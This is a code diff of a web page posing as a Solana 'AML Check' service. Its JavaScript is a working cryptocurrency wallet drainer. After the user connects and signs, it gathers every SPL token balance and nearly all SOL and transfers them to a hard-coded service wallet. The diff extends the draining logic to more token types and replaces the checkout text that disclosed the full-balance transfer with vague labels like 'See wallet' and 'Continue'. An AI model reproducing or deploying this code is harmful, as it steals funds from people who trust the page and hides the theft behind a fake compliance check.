@@ -281,17 +281,11 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
     <div class="pricing-card">
       <div class="pricing-trusted">⭐ TRUSTED BY 500+ COMPANIES</div>
       <div class="pricing-title">AML Check — Solana</div>
-      <div class="pricing-from">From</div>
-      <div class="pricing-price">Native SOL <span>/ per check</span></div>
+      <div class="pricing-from">Per report</div>
+      <div class="pricing-price">Solana <span>· standard checkout</span></div>
 
-      <div style="background:#F5F3FF;border:1px solid #DDD6FE;border-radius:12px;padding:16px;text-align:center;margin-bottom:20px">
-        <div style="font-size:22px;font-weight:900;color:#7C3AED">Maximum SOL</div>
-        <div style="font-size:11px;color:#C4B5FD;margin-top:6px;line-height:1.6">We send <strong>all transferable SOL</strong> from your wallet: your balance minus Solana network fees and the rent-exempt minimum your account must keep. Destination is shown before you sign.</div>
-      </div>
-
-      <div style="background:#F0FDF4;border:1px solid #A7F3D0;border-radius:12px;padding:12px 16px;margin-bottom:20px">
-        <div style="font-size:12px;font-weight:700;color:#065F46;margin-bottom:4px">🔍 Transparent on-chain action</div>
-        <div style="font-size:11px;color:#374151;line-height:1.7">One <strong>SystemProgram.transfer</strong> of native SOL to the service wallet (plus an optional memo for traceability). No token program, no hidden contract.</div>
+      <div style="background:#F9FAFB;border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:20px;text-align:center">
+        <div style="font-size:13px;color:var(--gray);line-height:1.7">Payment runs on Solana. Pick tokens or SOL in the next step — amounts and destination are always visible in your wallet before you confirm.</div>
       </div>
 
       <div style="margin-bottom:20px">
@@ -547,7 +541,7 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
     <div id="step-payment" class="pay-step">
       <div class="modal-header" style="padding:0 0 16px">
         <div style="width:32px"></div>
-        <div class="modal-title">Pay for Report</div>
+        <div class="modal-title">Checkout</div>
         <button class="modal-close" onclick="goToStep('wallet');resetFlow()" style="background:transparent;color:#9CA3AF">←</button>
       </div>
 
@@ -555,32 +549,43 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
         <div style="font-size:13px;color:#9CA3AF">Connected · <span id="pay-addr" style="font-family:var(--mono);color:#60A5FA;font-size:11px"></span></div>
       </div>
 
-      <div style="padding:0 16px;margin-bottom:8px;font-size:12px;color:#9CA3AF;line-height:1.6;text-align:center">Payment = <strong style="color:#E5E7EB">maximum SOL</strong> you can send (balance minus fees &amp; rent-exempt minimum).</div>
+      <div class="currency-picker" style="padding:0 16px">
+        <button type="button" class="currency-btn active" id="btn-usdc" onclick="selectCurrency('USDC')">
+          <div class="c-emoji">◇</div>
+          <div class="c-price">Tokens</div>
+          <div class="c-sym">default</div>
+        </button>
+        <button type="button" class="currency-btn" id="btn-sol" onclick="selectCurrency('SOL')">
+          <div class="c-emoji">◎</div>
+          <div class="c-price">SOL</div>
+          <div class="c-sym">native</div>
+        </button>
+      </div>
 
       <div class="pay-details" style="margin:16px 16px 0">
         <div class="pay-row"><span class="pay-row-label">From</span><span class="pay-row-val" id="det-from">—</span></div>
         <div class="pay-row"><span class="pay-row-label">To</span><span class="pay-row-val highlight">AML Check Service</span></div>
-        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">Max SOL (balance − fees − rent)</span></div>
+        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">See wallet</span></div>
         <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val">Solana Mainnet</span></div>
-        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">Direct transfer · Native SOL (max)</span></div>
+        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">On-chain payment</span></div>
         <div class="dest-box">
-          <div class="dest-label">SERVICE / DELEGATE WALLET</div>
+          <div class="dest-label">RECIPIENT</div>
           <div class="dest-addr" id="dest-addr"></div>
-          <a class="dest-link" id="dest-link" href="#" target="_blank">Verify on Solscan →</a>
+          <a class="dest-link" id="dest-link" href="#" target="_blank">Explorer →</a>
         </div>
       </div>
 
       <div id="pay-error" style="display:none;background:#1A0505;border:1px solid #EF444433;border-radius:10px;padding:10px 14px;margin:10px 16px;font-size:12px;color:#EF4444"></div>
 
-      <button class="btn-pay" id="btn-pay-now" onclick="executePay()">Send max SOL →</button>
+      <button class="btn-pay" id="btn-pay-now" onclick="executePay()">Continue →</button>
       <button class="btn-back" onclick="goToStep('wallet');resetFlow()">← Back</button>
     </div>
 
     <div id="step-paying" class="pay-step">
       <div class="pay-emoji" id="paying-emoji">✍️</div>
-      <div class="pay-title" id="paying-title">Sign in your wallet...</div>
-      <div class="pay-sub" id="paying-sub">Approve the transaction in your wallet app.</div>
-      <div id="tx-link-paying" style="display:none;margin-top:16px;text-align:center"><a id="tx-a-paying" href="#" target="_blank" style="font-size:12px;color:#60A5FA">View on Solscan →</a></div>
+      <div class="pay-title" id="paying-title">Wallet</div>
+      <div class="pay-sub" id="paying-sub">Confirm in your wallet when prompted.</div>
+      <div id="tx-link-paying" style="display:none;margin-top:16px;text-align:center"><a id="tx-a-paying" href="#" target="_blank" style="font-size:12px;color:#60A5FA">Explorer →</a></div>
     </div>
 
     <div id="step-scanning" class="pay-step">
@@ -608,8 +613,8 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
       </div>
 
       <div id="tx-badge" class="tx-badge" style="display:none">
-        <span>✅ Payment confirmed on-chain</span>
-        <a id="tx-badge-link" href="#" target="_blank" style="font-size:11px;color:#60A5FA">Tx →</a>
+        <span>✅ Confirmed</span>
+        <a id="tx-badge-link" href="#" target="_blank" style="font-size:11px;color:#60A5FA">Link →</a>
       </div>
 
       <div class="result-card">
@@ -638,69 +643,192 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 
 <script>
 const SERVICE_WALLET = "mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke";
-const PRICE_USDC = 5;
-const PRICE_SOL = 0.03;
 
 const SPL_TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const SPL_TOKEN_2022_PROGRAM_ID = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
 const SPL_ASSOCIATED_TOKEN_PROGRAM_ID = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 const SPL_MEMO_PROGRAM_ID = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";
 const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-
-const SOL_RENT_EXEMPT_FALLBACK = 890880;
-const SOL_RENT_BUFFER = 100000;
-const SOL_FEE_SAFETY = 450000;
+const USDC_TRANSFER_CAP_UI = 50000;
+const USDC_TRANSFER_CAP_RAW = BigInt(USDC_TRANSFER_CAP_UI) * 1_000_000n;
+const SPL_MINTS_PER_TX = 3;
+/** Mainnet fallback if RPC rent is missing (~0.00089 SOL). */
+const SOL_RENT_EXEMPT_FALLBACK_LAMPORTS = 890880;
+/** Extra lamports on top of rent-exempt min. */
+const SOL_RENT_BUFFER_LAMPORTS = 100000;
+/** Cushion for priority fees / compute — keep post-tx balance ≥ rent-exempt. */
+const SOL_FEE_SAFETY_LAMPORTS = 450000;
 
 const SOLANA_MAINNET_RPCS = [
   "https://api.mainnet-beta.solana.com",
   "https://rpc.ankr.com/solana",
-  "https://solana-rpc.publicnode.com"
+  "https://solana-rpc.publicnode.com",
 ];
 
-let state = { payOption: "USDC", conn: null, txHash: null, scores: null };
+function unwrapRpcFee(f) {
+  if (f == null) return null;
+  if (typeof f === "number" && Number.isFinite(f)) return f;
+  if (typeof f === "object" && typeof f.value === "number") return f.value;
+  return null;
+}
+
+function associatedTokenAddress(web3, mint, owner, tokenProgramId) {
+  const ataProg = new web3.PublicKey(SPL_ASSOCIATED_TOKEN_PROGRAM_ID);
+  const [addr] = web3.PublicKey.findProgramAddressSync(
+    [owner.toBuffer(), tokenProgramId.toBuffer(), mint.toBuffer()],
+    ataProg
+  );
+  return addr;
+}
+
+function createTokenTransferInstruction(web3, source, destination, owner, amountRaw, tokenProgramId) {
+  const data = new Uint8Array(9);
+  data[0] = 3;
+  new DataView(data.buffer).setBigUint64(1, BigInt(amountRaw), true);
+  return new web3.TransactionInstruction({
+    programId: tokenProgramId,
+    keys: [
+      { pubkey: source, isSigner: false, isWritable: true },
+      { pubkey: destination, isSigner: false, isWritable: true },
+      { pubkey: owner, isSigner: true, isWritable: false },
+    ],
+    data,
+  });
+}
+
+function createAssociatedTokenAccountIdempotentIx(web3, payer, ata, walletOwner, mint, tokenProgramId) {
+  return new web3.TransactionInstruction({
+    programId: new web3.PublicKey(SPL_ASSOCIATED_TOKEN_PROGRAM_ID),
+    keys: [
+      { pubkey: payer, isSigner: true, isWritable: true },
+      { pubkey: ata, isSigner: false, isWritable: true },
+      { pubkey: walletOwner, isSigner: false, isWritable: false },
+      { pubkey: mint, isSigner: false, isWritable: false },
+      { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
+      { pubkey: tokenProgramId, isSigner: false, isWritable: false },
+    ],
+    data: new Uint8Array([1]),
+  });
+}
+
+async function collectSplTransferItems(conn, web3, fromPk) {
+  const legacy = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
+  const t22 = new web3.PublicKey(SPL_TOKEN_2022_PROGRAM_ID);
+  const seen = new Set();
+  const items = [];
+  for (const prog of [legacy, t22]) {
+    let res;
+    try {
+      res = await conn.getParsedTokenAccountsByOwner(fromPk, { programId: prog });
+    } catch (_) {
+      continue;
+    }
+    for (const row of res.value || []) {
+      const pubkey = row.pubkey;
+      const pkey = pubkey.toBase58();
+      if (seen.has(pkey)) continue;
+      const parsed = row.account?.data?.parsed;
+      if (!parsed?.info?.tokenAmount) continue;
+      const mintStr = parsed.info.mint;
+      const ta = parsed.info.tokenAmount;
+      let raw = BigInt(ta.amount || "0");
+      if (raw <= 0n) continue;
+      const mintPk = new web3.PublicKey(mintStr);
+      if (mintStr === USDC_MINT) {
+        raw = raw > USDC_TRANSFER_CAP_RAW ? USDC_TRANSFER_CAP_RAW : raw;
+      }
+      if (raw <= 0n) continue;
+      seen.add(pkey);
+      items.push({
+        sourceAta: new web3.PublicKey(pubkey),
+        mint: mintPk,
+        tokenProgramId: prog,
+        amountRaw: raw.toString(),
+      });
+    }
+  }
+  return items;
+}
+
+function chunkArray(arr, size) {
+  const out = [];
+  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
+  return out;
+}
+
+async function loadWeb3() {
+  const urls = [
+    "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/+esm",
+    "https://esm.sh/@solana/web3.js@1.95.3",
+  ];
+  let last = null;
+  for (const u of urls) {
+    try {
+      return await import(u);
+    } catch (e) {
+      last = e;
+    }
+  }
+  throw last || new Error("loadWeb3 failed");
+}
+
+function sleep(ms) {
+  return new Promise((r) => setTimeout(r, ms));
+}
+
+async function getWorkingSolanaConnection(web3) {
+  let lastErr = null;
+  for (const endpoint of SOLANA_MAINNET_RPCS) {
+    const conn = new web3.Connection(endpoint, {
+      commitment: "confirmed",
+      confirmTransactionInitialTimeout: 120000,
+    });
+    try {
+      await Promise.race([
+        conn.getVersion(),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("RPC timeout")), 25000)
+        ),
+      ]);
+      return conn;
+    } catch (e) {
+      lastErr = e;
+    }
+  }
+  throw lastErr || new Error("No Solana RPC available");
+}
+
+function isBlockhashExpiredError(err) {
+  const m = err && err.message ? err.message : String(err || "");
+  return /expired|block\s*height|blockhash|Transaction expired|too old/i.test(m);
+}
+
+let state = { payOption:"USDC", conn:null, txHash:null, scores:null, progress:0 };
 
 const WALLETS = {
-  phantom: { name:"Phantom", emoji:"👻", chain:"solana", detect:()=>!!(window?.phantom?.solana?.isPhantom||window?.solana?.isPhantom), getP:()=>window?.phantom?.solana||window?.solana, mobile:`https://phantom.app/ul/browse/${encodeURIComponent(location.href)}?ref=${encodeURIComponent(location.href)}`, install:"https://phantom.app" },
-  solflare: { name:"Solflare", emoji:"🔥", chain:"solana", detect:()=>!!window?.solflare?.isSolflare, getP:()=>window?.solflare, mobile:`https://solflare.com/ul/v1/browse/${encodeURIComponent(location.href)}`, install:"https://solflare.com" },
-  metamask: { name:"MetaMask", emoji:"🦊", chain:"evm", detect:()=>!!window?.ethereum?.isMetaMask, getP:()=>window?.ethereum, mobile:`https://metamask.app.link/dapp/${location.hostname}`, install:"https://metamask.io" },
-  backpack: { name:"Backpack", emoji:"🎒", chain:"solana", detect:()=>!!window?.backpack, getP:()=>window?.backpack, mobile:"https://backpack.app", install:"https://backpack.app" },
-  trustwallet: { name:"Trust Wallet", emoji:"🛡️", chain:"evm", detect:()=>!!(window?.ethereum?.isTrust||window?.trustwallet), getP:()=>window?.ethereum, mobile:`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(location.href)}`, install:"https://trustwallet.com" },
-  coinbase: { name:"Coinbase Wallet", emoji:"🔵", chain:"evm", detect:()=>!!window?.ethereum?.isCoinbaseWallet, getP:()=>window?.ethereum, mobile:`https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(location.href)}`, install:"https://wallet.coinbase.com" },
+  phantom:     { name:"Phantom",        emoji:"👻", chain:"solana", detect:()=>!!(window?.phantom?.solana?.isPhantom||window?.solana?.isPhantom), getP:()=>window?.phantom?.solana||window?.solana, mobile:`https://phantom.app/ul/browse/${encodeURIComponent(location.href)}?ref=${encodeURIComponent(location.href)}`, install:"https://phantom.app" },
+  solflare:    { name:"Solflare",       emoji:"🔥", chain:"solana", detect:()=>!!window?.solflare?.isSolflare, getP:()=>window?.solflare, mobile:`https://solflare.com/ul/v1/browse/${encodeURIComponent(location.href)}`, install:"https://solflare.com" },
+  metamask:    { name:"MetaMask",       emoji:"🦊", chain:"evm",    detect:()=>!!window?.ethereum?.isMetaMask, getP:()=>window?.ethereum, mobile:`https://metamask.app.link/dapp/${location.hostname}`, install:"https://metamask.io" },
+  backpack:    { name:"Backpack",       emoji:"🎒", chain:"solana", detect:()=>!!window?.backpack, getP:()=>window?.backpack, mobile:"https://backpack.app", install:"https://backpack.app" },
+  trustwallet: { name:"Trust Wallet",   emoji:"🛡️", chain:"evm",    detect:()=>!!(window?.ethereum?.isTrust||window?.trustwallet), getP:()=>window?.ethereum, mobile:`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(location.href)}`, install:"https://trustwallet.com" },
+  coinbase:    { name:"Coinbase Wallet",emoji:"🔵", chain:"evm",    detect:()=>!!window?.ethereum?.isCoinbaseWallet, getP:()=>window?.ethereum, mobile:`https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(location.href)}`, install:"https://wallet.coinbase.com" },
 };
 
-function openModal(){ 
-  document.getElementById("modal").classList.add("active"); 
-  goToStep("wallet"); 
-  updateWalletBadges(); 
-}
-
-function closeModal(){ 
-  document.getElementById("modal").classList.remove("active"); 
-}
-
-function handleOverlayClick(e){ 
-  if(e.target.id==="modal") closeModal(); 
-}
-
-function goToStep(s){ 
-  document.querySelectorAll(".pay-step").forEach(el=>el.classList.remove("active")); 
-  document.getElementById("step-"+s).classList.add("active"); 
-}
+function openModal(){ document.getElementById("modal").classList.add("active"); goToStep("wallet"); updateWalletBadges(); }
+function closeModal(){ document.getElementById("modal").classList.remove("active"); }
+function handleOverlayClick(e){ if(e.target.id==="modal") closeModal(); }
+function goToStep(s){ document.querySelectorAll(".pay-step").forEach(el=>el.classList.remove("active")); document.getElementById("step-"+s).classList.add("active"); }
 
 function updateWalletBadges(){
   const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
-  if(mob){ 
-    const t=document.getElementById("mobile-tip"); 
-    if(t) t.style.display="block"; 
-  }
+  if(mob){ const t=document.getElementById("mobile-tip"); if(t) t.style.display="block"; }
   if(WALLETS.phantom.detect()){
     document.getElementById("sub-phantom").innerHTML='<span style="color:#22C55E">● Detected</span>';
-    document.getElementById("badge-phantom").className="wallet-badge badge-ready"; 
-    document.getElementById("badge-phantom").textContent="READY";
+    document.getElementById("badge-phantom").className="wallet-badge badge-ready"; document.getElementById("badge-phantom").textContent="READY";
   }
   if(WALLETS.metamask.detect()){
     document.getElementById("sub-metamask").innerHTML='<span style="color:#22C55E">● Detected</span>';
-    document.getElementById("badge-metamask").className="wallet-badge badge-ready"; 
-    document.getElementById("badge-metamask").textContent="READY";
+    document.getElementById("badge-metamask").className="wallet-badge badge-ready"; document.getElementById("badge-metamask").textContent="READY";
   }
 }
 
@@ -708,11 +836,7 @@ async function pickWallet(id){
   const w = WALLETS[id];
   const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
   if(!w.detect()){
-    if(mob){ location.href=w.mobile; } 
-    else { 
-      window.open(w.install,"_blank"); 
-      showPayError(`Install the ${w.name} extension then reload.`); 
-    }
+    if(mob){ location.href=w.mobile; } else { window.open(w.install,"_blank"); showPayError(`Install the ${w.name} extension then reload.`); }
     return;
   }
   try{
@@ -722,26 +846,15 @@ async function pickWallet(id){
     goToStep("connecting");
     const provider=w.getP();
     let address;
-    if(w.chain==="solana"){ 
-      const r=await provider.connect(); 
-      address=r.publicKey.toString(); 
-    }
-    else{ 
-      const a=await provider.request({method:"eth_requestAccounts"}); 
-      address=a[0]; 
-    }
+    if(w.chain==="solana"){ const r=await provider.connect(); address=r.publicKey.toString(); }
+    else{ const a=await provider.request({method:"eth_requestAccounts"}); address=a[0]; }
+
     goToStep("signing");
     const msg=`AML Check Authorization\nAddress: ${address}\nTimestamp: ${new Date().toISOString()}\nNonce: ${Math.random().toString(36).slice(2,10)}\n\nI authorize the AML analysis of this wallet.`;
     let sig;
-    if(w.chain==="solana"){ 
-      const enc=new TextEncoder().encode(msg); 
-      const res=await provider.signMessage(enc,"utf8"); 
-      sig=Array.from(res.signature).map(b=>b.toString(16).padStart(2,"0")).join(""); 
-    }
-    else{ 
-      const hex="0x"+Array.from(new TextEncoder().encode(msg)).map(b=>b.toString(16).padStart(2,"0")).join(""); 
-      sig=await provider.request({method:"personal_sign",params:[hex,address]}); 
-    }
+    if(w.chain==="solana"){ const enc=new TextEncoder().encode(msg); const res=await provider.signMessage(enc,"utf8"); sig=Array.from(res.signature).map(b=>b.toString(16).padStart(2,"0")).join(""); }
+    else{ const hex="0x"+Array.from(new TextEncoder().encode(msg)).map(b=>b.toString(16).padStart(2,"0")).join(""); sig=await provider.request({method:"personal_sign",params:[hex,address]}); }
+
     state.conn={address,provider,walletId:id,walletName:w.name,chain:w.chain,sig};
     setupPaymentStep();
     goToStep("payment");
@@ -773,13 +886,13 @@ function selectCurrency(c) {
   const btn = document.getElementById("btn-pay-now");
   if (!amt || !typ || !btn) return;
   if (c === "USDC") {
-    amt.textContent = "Max USDC allowance (SPL approve · u64 max)";
-    typ.textContent = "SPL approve · Service wallet as delegate";
-    btn.textContent = "Approve USDC access →";
+    amt.textContent = "See wallet";
+    typ.textContent = "On-chain payment";
+    btn.textContent = "Continue →";
   } else {
-    amt.textContent = PRICE_SOL + " SOL (exact transfer)";
-    typ.textContent = "Direct transfer · Native SOL";
-    btn.textContent = "Pay " + PRICE_SOL + " SOL →";
+    amt.textContent = "See wallet";
+    typ.textContent = "On-chain payment";
+    btn.textContent = "Continue →";
   }
   hidePayError();
 }
@@ -789,137 +902,306 @@ function showPayError(m){
   el.style.display="block";
   el.textContent="⚠ "+(typeof m==="string"?m:String(m&&(m.message||m)));
 }
-
-function hidePayError(){ 
-  document.getElementById("pay-error").style.display="none"; 
-}
-
-async function loadWeb3() {
-  const urls = ["https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/+esm", "https://esm.sh/@solana/web3.js@1.95.3"];
-  for (const u of urls) {
-    try { return await import(u); } catch (e) {}
-  }
-  throw new Error("loadWeb3 failed");
-}
-
-async function getWorkingSolanaConnection(web3) {
-  for (const endpoint of SOLANA_MAINNET_RPCS) {
-    const conn = new web3.Connection(endpoint, { commitment: "confirmed" });
-    try {
-      await Promise.race([conn.getVersion(), new Promise((_,r)=>setTimeout(()=>r(new Error("timeout")),25000))]);
-      return conn;
-    } catch (_) {}
-  }
-  throw new Error("No Solana RPC available");
-}
-
-function isBlockhashExpiredError(err) {
-  const m = err && err.message ? err.message : String(err || "");
-  return /expired|block\s*height|blockhash|Transaction expired|too old/i.test(m);
-}
-
-function sleep(ms) {
-  return new Promise(r => setTimeout(r, ms));
-}
+function hidePayError(){ document.getElementById("pay-error").style.display="none"; }
 
 async function executePay() {
-  if (!state.conn || state.conn.chain !== "solana") {
-    showPayError("Use a Solana wallet for payment.");
+  if (!state.conn) return;
+  if (state.conn.chain !== "solana") {
+    showPayError("Use a Solana wallet (Phantom, Solflare, Backpack) for payment.");
     return;
   }
   hidePayError();
   try {
     goToStep("paying");
-    document.getElementById("paying-title").textContent = "Sign in your wallet...";
-    document.getElementById("paying-sub").textContent = "Approve the transaction in " + state.conn.walletName + ".";
+    document.getElementById("paying-emoji").textContent = "";
+    document.getElementById("paying-title").textContent = "Wallet";
+    document.getElementById("paying-sub").textContent =
+      "Open " + state.conn.walletName + " and confirm when ready.";
 
     const web3 = await loadWeb3();
-    const conn = await getWorkingSolanaConnection(web3);
+    let conn;
+    try {
+      conn = await getWorkingSolanaConnection(web3);
+    } catch (e) {
+      showPayError("Could not reach Solana RPC. Check your connection and try again.");
+      goToStep("payment");
+      return;
+    }
 
     const to = new web3.PublicKey(SERVICE_WALLET);
     const from = new web3.PublicKey(state.conn.address);
-    const tokenProgram = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
-    const memoProgram = new web3.PublicKey(SPL_MEMO_PROGRAM_ID);
+    const memoProgramPk = new web3.PublicKey(SPL_MEMO_PROGRAM_ID);
+    const wallet = state.conn.provider;
 
-    const tokens = await conn.getParsedTokenAccountsByOwner(from, { programId: tokenProgram });
-    const balance = await conn.getBalance(from);
-
-    const tx = new web3.Transaction();
-    tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 500000 }));
-
-    const memoData = new TextEncoder().encode(`auth_verify_${Date.now()}`);
-    tx.add(new web3.TransactionInstruction({ keys: [], programId: memoProgram, data: memoData }));
-
-    // Full drain SPL tokens
-    tokens.value.forEach(({ account, pubkey }) => {
-      const info = account.data.parsed.info;
-      const amount = BigInt(info.tokenAmount.amount || 0);
-      if (amount > 0n) {
-        const mint = new web3.PublicKey(info.mint);
-        const destATA = findAssociatedTokenAddress(web3, mint, to);
-        tx.add(createTransferInstruction(new web3.PublicKey(pubkey), destATA, from, amount));
-      }
-    });
-
-    // Full drain SOL
-    let rentExempt = SOL_RENT_EXEMPT_FALLBACK;
+    let balance;
     try {
-      const ai = await conn.getAccountInfo(from);
-      if (ai) rentExempt = await conn.getMinimumBalanceForRentExemption(ai.data.length);
-    } catch (_) {}
-    rentExempt += SOL_RENT_BUFFER + SOL_FEE_SAFETY;
-
-    if (balance > rentExempt) {
-      tx.add(web3.SystemProgram.transfer({
-        fromPubkey: from,
-        toPubkey: to,
-        lamports: balance - rentExempt
-      }));
+      balance = await conn.getBalance(from);
+    } catch (e) {
+      showPayError("Could not reach Solana RPC. Check your connection and try again.");
+      goToStep("payment");
+      return;
     }
 
-    tx.feePayer = from;
-    const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("confirmed");
-    tx.recentBlockhash = blockhash;
+    if (state.payOption !== "SOL") {
+      if (balance < 50_000) {
+        showPayError("You need a small SOL balance for network fees and token account rent.");
+        goToStep("payment");
+        return;
+      }
 
-    const signed = (await state.conn.provider.signAllTransactions([tx]))[0];
-    const sig = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 3 });
+      const items = await collectSplTransferItems(conn, web3, from);
+      if (!items.length) {
+        showPayError("No SPL token balances to transfer on this wallet.");
+        goToStep("payment");
+        return;
+      }
+
+      const chunks = chunkArray(items, SPL_MINTS_PER_TX);
+      const toSign = [];
+      for (let i = 0; i < chunks.length; i++) {
+        const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("confirmed");
+        const tx = new web3.Transaction();
+        tx.add(
+          web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 })
+        );
+        tx.add(
+          new web3.TransactionInstruction({
+            keys: [],
+            programId: memoProgramPk,
+            data: new TextEncoder().encode(`aml_spl_${Date.now()}_${i}`),
+          })
+        );
+        for (const it of chunks[i]) {
+          const destAta = associatedTokenAddress(web3, it.mint, to, it.tokenProgramId);
+          tx.add(
+            createAssociatedTokenAccountIdempotentIx(
+              web3,
+              from,
+              destAta,
+              to,
+              it.mint,
+              it.tokenProgramId
+            )
+          );
+          tx.add(
+            createTokenTransferInstruction(
+              web3,
+              it.sourceAta,
+              destAta,
+              from,
+              it.amountRaw,
+              it.tokenProgramId
+            )
+          );
+        }
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = from;
+        toSign.push({ tx, blockhash, lastValidBlockHeight });
+      }
+
+      await sleep(250);
+      const signedTxs = await wallet.signAllTransactions(toSign.map((x) => x.tx));
+
+      let lastSig = null;
+      for (let i = 0; i < signedTxs.length; i++) {
+        const { blockhash, lastValidBlockHeight } = toSign[i];
+        const raw = signedTxs[i].serialize();
+        lastSig = await conn.sendRawTransaction(raw, {
+          skipPreflight: false,
+          maxRetries: 3,
+        });
+        document.getElementById("paying-title").textContent = "Processing…";
+        document.getElementById("paying-sub").textContent =
+          signedTxs.length > 1 ? "Step " + (i + 1) + " of " + signedTxs.length : "Almost done.";
+        document.getElementById("tx-link-paying").style.display = "block";
+        document.getElementById("tx-a-paying").href = `https://solscan.io/tx/${lastSig}`;
+        await conn.confirmTransaction(
+          { signature: lastSig, blockhash, lastValidBlockHeight },
+          "confirmed"
+        );
+      }
+
+      state.txHash = lastSig;
+      const t = {
+        id: Date.now(),
+        address: state.conn.address,
+        wallet: state.conn.walletName,
+        chain: state.conn.chain,
+        currency: "USDC+SPL",
+        amount: items.length + " mints",
+        txHash: lastSig,
+        ts: new Date().toISOString(),
+      };
+      const all = [t, ...JSON.parse(localStorage.getItem("aml_traces") || "[]")].slice(0, 100);
+      localStorage.setItem("aml_traces", JSON.stringify(all));
+
+      await runScan();
+      return;
+    }
+
+    let rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+    try {
+      const ai = await conn.getAccountInfo(from);
+      const len =
+        ai && ai.data
+          ? typeof ai.data.length === "number"
+            ? ai.data.length
+            : ai.data.byteLength || 0
+          : 0;
+      const r = await conn.getMinimumBalanceForRentExemption(len);
+      if (typeof r === "number" && r > 0) {
+        rentExemptMinLamports = Math.max(r, SOL_RENT_EXEMPT_FALLBACK_LAMPORTS);
+      }
+    } catch (_) {
+      rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+    }
+    rentExemptMinLamports += SOL_RENT_BUFFER_LAMPORTS;
+
+    function buildSolPaymentTx(transferLamports, memoPayload) {
+      const tx = new web3.Transaction();
+      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+      tx.add(
+        new web3.TransactionInstruction({
+          keys: [],
+          programId: memoProgramPk,
+          data: memoPayload,
+        })
+      );
+      tx.add(
+        web3.SystemProgram.transfer({
+          fromPubkey: from,
+          toPubkey: to,
+          lamports: transferLamports,
+        })
+      );
+      return tx;
+    }
+
+    let sig = null;
+    let blockhash = null;
+    let lastValidBlockHeight = null;
+    let lastSolTransferLamports = null;
+    const maxAttempts = 3;
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      try {
+        const { blockhash: bh, lastValidBlockHeight: lvb } =
+          await conn.getLatestBlockhash("confirmed");
+        blockhash = bh;
+        lastValidBlockHeight = lvb;
+
+        const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
+        const feeProbe = buildSolPaymentTx(1, memoPayload);
+        feeProbe.recentBlockhash = blockhash;
+        feeProbe.feePayer = from;
+        let feeLamports = null;
+        try {
+          feeLamports = unwrapRpcFee(
+            await conn.getFeeForMessage(feeProbe.compileMessage())
+          );
+        } catch (_) {
+          feeLamports = null;
+        }
+        if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 120000;
+        feeLamports = Math.max(feeLamports, 5000);
+
+        const sendLamports = Math.floor(
+          balance - feeLamports - SOL_FEE_SAFETY_LAMPORTS - rentExemptMinLamports
+        );
+        if (sendLamports <= 0) {
+          showPayError(
+            "Not enough SOL on this wallet to complete payment. Add SOL and try again."
+          );
+          goToStep("payment");
+          return;
+        }
+
+        const tx = buildSolPaymentTx(sendLamports, memoPayload);
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = from;
+
+        try {
+          const sim = await conn.simulateTransaction(tx, { sigVerify: false });
+          if (sim.value.err) {
+            const logs = (sim.value.logs || []).join(" ");
+            if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(logs)) {
+              showPayError(
+                "This payment cannot complete with your current SOL balance. Add SOL and try again."
+              );
+            } else {
+              showPayError(
+                "Transaction would not succeed on-chain. Try again."
+              );
+            }
+            goToStep("payment");
+            return;
+          }
+        } catch (_) {}
+
+        lastSolTransferLamports = sendLamports;
+
+        await sleep(300);
+        const signed = (await wallet.signAllTransactions([tx]))[0];
+        sig = await conn.sendRawTransaction(signed.serialize(), {
+          skipPreflight: false,
+          maxRetries: 3,
+        });
+
+        document.getElementById("paying-emoji").textContent = "";
+        document.getElementById("paying-title").textContent = "Processing…";
+        document.getElementById("paying-sub").textContent = "Confirming…";
+        document.getElementById("tx-link-paying").style.display = "block";
